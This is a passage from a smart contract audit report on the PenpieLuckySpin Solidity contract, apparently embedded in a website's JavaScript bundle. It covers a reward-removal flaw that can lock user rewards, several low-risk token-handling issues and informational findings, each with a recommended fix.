[PenpieLuckySpin](https://github.com/magpiexyz/penpie-contracts/blob/fffeb5e43e829ae1ed144f25ffa9d81dbaa034c0/contracts/rewards/PenpieLuckySpin.sol#L291-L300)\r\n\r\n**Impact:** Removing a reward from the PenpieLuckySpin contract can inadvertently lock user's rewards and prevent subsequent spins. This can result in potential losses for users and cause service disruption.\r\n\r\n**Description**: The contract allows the owner to add rewards using the addReward function:\r\n\r\n```solidity\r\n    function addReward(address _token, uint256 _baseRate, uint256 _probWeight) public onlyOwner whenPaused {\r\n        spinRewards[rewardsCount] = SpinReward(_token, _baseRate, _probWeight);\r\n        rewardsCount++;\r\n    }\r\n```\r\n\r\nRewards are then calculated and if a user wins, his reward is associated with a specific number through the fulfillRandomWords function:\r\n\r\n```solidity\r\n    function fulfillRandomWords(\r\n        uint256 _requestId ,\r\n        uint256[] memory randomWords\r\n    ) internal override _onlyCoordinator {\r\n        address userAddress = userRequests[_requestId];\r\n        UserSpinInfo storage userInfo = userSpinInfos[userAddress];\r\n        userInfo.waitingVRF = false;\r\n>>        userInfo.requestResult = _pickRandomReward(randomWords[0]);\r\n```\r\n\r\nHowever, there's a critical flaw in the removal process. The removeReward function does not take into account any pending-to-be-claimed rewards:\r\n\r\n```solidity\r\n    function removeReward(uint256 _index) external onlyOwner whenPaused {\r\n        if(_index >= rewardsCount) revert OutOfRange();\r\n\r\n        if (_index < rewardsCount - 1) {\r\n            spinRewards[_index] = spinRewards[rewardsCount - 1];\r\n        }\r\n        delete spinRewards[rewardsCount - 1];\r\n        rewardsCount--;\r\n    }\r\n```\r\n\r\nThis creates an issue because once the reward is removed, users with pending rewards can neither claim them nor request another spin as the waitingClaim variable would remain \"true\".\r\n\r\nThis design oversight effectively renders the removal of rewards problematic for the protocol. If executed, it guarantees disruption for users by either causing losses or making their rewards inaccessible.\r\n\r\n**Recommendation**: Implement a mechanism that checks for any pending-to-be-claimed rewards tied to the specific index before removal.\r\n\r\nAdditionally, you could reorganize the data structure to accommodate changes without affecting existing rewards or implement versioning to transition users smoothly.\r\n\r\n## Low Risk\r\n\r\n### [L-1] Unsafe use of transfer()/transferFrom() with IERC20\r\n\r\n**Context:** [PenpieLuckySpin.sol](https://github.com/magpiexyz/penpie-contracts/blob/fffeb5e43e829ae1ed144f25ffa9d81dbaa034c0/contracts/rewards/PenpieLuckySpin.sol#L176)\r\n\r\n**Description:** Some tokens do not implement the ERC20 standard properly but are still accepted by most code that accepts ERC20 tokens. When these sorts of tokens are cast to `IERC20`, their [function signatures](https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca) do not match and therefore the calls made, revert (see [this](https://gist.github.com/IllIllI000/2b00a32e8f0559e8f386ea4f1800abc5) link for a test case).\r\n\r\nUse OpenZeppelin's `SafeERC20`'s `safeTransfer()`/`safeTransferFrom()` instead\r\n\r\n```solidity\r\n        IERC20(inputToken).transferFrom(msg.sender, address(this), _inputAmount);\r\n```\r\n\r\n### [L-2] safeApprove() is deprecated\r\n\r\n**Context:** [PenpieLuckySpin.sol](https://github.com/magpiexyz/penpie-contracts/blob/fffeb5e43e829ae1ed144f25ffa9d81dbaa034c0/contracts/rewards/PenpieLuckySpin.sol#L180)\r\n\r\n**Description:** [Deprecated](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/bfff03c0d2a59bcd8e2ead1da9aed9edf0080d05/contracts/token/ERC20/utils/SafeERC20.sol#L38-L45) in favor of safeIncreaseAllowance() and safeDecreaseAllowance(). If only setting the initial allowance to the value that means infinite, safeIncreaseAllowance() can be used instead. The function may currently work, but if a bug is found in this version of OpenZeppelin, and the version that you're forced to upgrade to no longer has this function, you'll encounter unnecessary delays in porting and testing replacement contracts.\r\n\r\n```solidity\r\nIERC20(inputToken).safeApprove(address(converter), _inputAmount);\r\n```\r\n\r\n### [L-3] safeApprove() may revert if the current approval is not zero\r\n\r\n**Context:** [PenpieLuckySpin.sol](https://github.com/magpiexyz/penpie-contracts/blob/fffeb5e43e829ae1ed144f25ffa9d81dbaa034c0/contracts/rewards/PenpieLuckySpin.sol#L180)\r\n\r\n**Description:** While Tether is known to do this, it applies to other tokens as well, which are trying to protect against [this attack vector](https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/edit). safeApprove() itself also implements this protection. Always reset the approval to zero before changing it to a new value (forceApprove() does this for you), or use safeIncreaseAllowance()/safeDecreaseAllowance()\r\n\r\n```solidity\r\n      IERC20(inputToken).safeApprove(address(converter), _inputAmount);\r\n```\r\n\r\n### [L-4] Set a lower/upper bound on reward rate/weights\r\n\r\n**Context:** [PenpieLuckySpin.sol](https://github.com/magpiexyz/penpie-contracts/blob/fffeb5e43e829ae1ed144f25ffa9d81dbaa034c0/contracts/rewards/PenpieLuckySpin.sol#L271-L276)\r\n\r\n**Description:** Consider adding minimum/maximum value checks to ensure that the reward base rate/weight below can never be used to excessively harm users\r\n\r\n```solidity\r\n    function updateReward(uint256 _index, uint256 newBaseRate, uint256 newProbWeight) external onlyOwner whenPaused {\r\n        if(_index >= rewardsCount) revert OutOfRange();\r\n\r\n        SpinReward storage reward = spinRewards[_index];\r\n        reward.baseRate = newBaseRate;\r\n        reward.probWeight = newProbWeight;\r\n\r\n        // emit RewardUpdated(_index, reward.token, newBaseRate, newProbWeight);\r\n    }\r\n```\r\n\r\n## Informational\r\n\r\n### [I-1] Consider using uint48 for time-related variables\r\n\r\n**Context:** [PenpieLuckySpin.sol](https://github.com/magpiexyz/penpie-contracts/blob/fffeb5e43e829ae1ed144f25ffa9d81dbaa034c0/contracts/rewards/PenpieLuckySpin.sol#L31)\r\n\r\n**Description**\r\n\r\nWhile `uint32` ends in 2106 and could cause some issues in this distant future, higher types than `uint48` (like `uint256`) aren't necessary for time-related variables.\r\n\r\n```solidity\r\n        uint256 spinTime;\r\n```\r\n\r\n### [I-2] Missing Event for critical parameters change\r\n\r\n**Context:** [PenpieLuckySpin.sol](https://github.com/magpiexyz/penpie-contracts/blob/fffeb5e43e829ae1ed144f25ffa9d81dbaa034c0/contracts/rewards/PenpieLuckySpin.sol#L267-L306)\r\n\r\n**Description:** Events help non-contract tools to track changes, and events prevent users from being surprised by changes.\r\n\r\n```solidity\r\n  function addReward(address _token, uint256 _baseRate, uint256 _probWeight) public onlyOwner whenPaused {\r\n    ...\r\n    }\r\n\r\n    function updateReward(uint256 _index, uint256 newBaseRate, uint256 newProbWeight) external onlyOwner whenPaused {\r\n    }\r\n\r\n    function removeReward(uint256 _index) external onlyOwner whenPaused {\r\n    ...\r\n    }\r\n\r\n    function setThresholds(Threshold[] memory _thresholds) public onlyOwner whenPaused {\r\n    ...\r\n    }\r\n```\r\n\r\n### [I-3] Remove unused code\r\n\r\n**Context:** [PenpieLuckySpin.sol](https://github.com/magpiexyz/penpie-contracts/blob/fffeb5e43e829ae1ed144f25ffa9d81dbaa034c0/contracts/rewards/PenpieLuckySpin.sol#L48)\r\n\r\n**Description**\r\n\r\n```solidity\r\n    uint256 public constant WAD = 1e18;\r\n```\r\n",pdfLink:"https://github.com/bytes032/reports/blob/main/PenpieLuckySpin.pdf"}].reverse(),s=o.map(function(e){let{title:n,slug:t,findings:r,createdAt:a}=e;return{title:n,slug:t,findings:r,createdAt:a}});var c=t(4227),l=t(22911),d=t(25675),u=t.n(d),h=t(23297);let m=i.memo(e=>{let{report:n,active:t}=e;return(0,r.jsx)(h.H,{href:"/audits/[slug]",as:"/audits/".concat(n.slug),title:n.title,description:null,leadingAccessory:(0,r.jsx)(u(),{width:48,height:48,layout:"fixed",alt:n.title,className:"rounded-xl",src:"/static/img/reports/".concat(n.slug,".jpeg")}),byline:"".concat(n.findings," findings"),active:t},n.slug)}),f=i.memo(()=>{let e=(0,a.useRouter)(),[n,t]=i.useState(null),o=e=>Number(new Date(e.split("/").reverse().join("-")));return(0,r.jsxs)(c.V,{"data-cy":"apps-list",onRef:t,children:[(0,r.jsx)(l.T,{scrollContainerRef:n,title:"Reports"}),(0,r.jsx)("div",{className:"pb-24 lg:space-y-1 lg:p-3",children:s.sort((e,n)=>o(n.createdAt)-o(e.createdAt)).map(n=>{let t=e.query.slug===n.slug;return(0,r.jsx)(m,{report:n,active:t},n.slug)})})]})})}}]);